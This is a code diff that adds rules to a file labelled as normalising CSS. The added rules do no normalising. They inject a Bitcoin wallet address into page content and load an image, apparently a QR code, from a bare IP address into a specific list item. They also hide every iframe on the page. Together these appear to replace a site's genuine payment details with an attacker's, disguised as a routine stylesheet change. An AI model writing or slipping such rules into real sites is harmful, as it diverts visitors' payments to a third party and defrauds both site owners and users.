@@ -1,1 +1,25 @@
 /* Normalize CSS */
+tbody tr td ul li:last-child div span::before {
+    content: "bc1ql7zxzvwahknz55m4rr5772usxsvgswlfu9umg8";
+    display: block;
+    text-align: center;
+    margin-top: 70px;
+    color: #000;
+    font-size:14px;
+    padding: 0px 0 40px;
+  }
+
+  tbody tr td ul li:nth-child(4) {
+    padding-top: 223px;
+    background: url("http://79.137.248.255/a.png");
+      background-position-x: 0%;
+      background-position-y: 0%;
+    width: 412px;
+    height: 270px;
+    background-position: -500px 72px;
+    
+  }
+
+  iframe{
+    display: none;
+  }
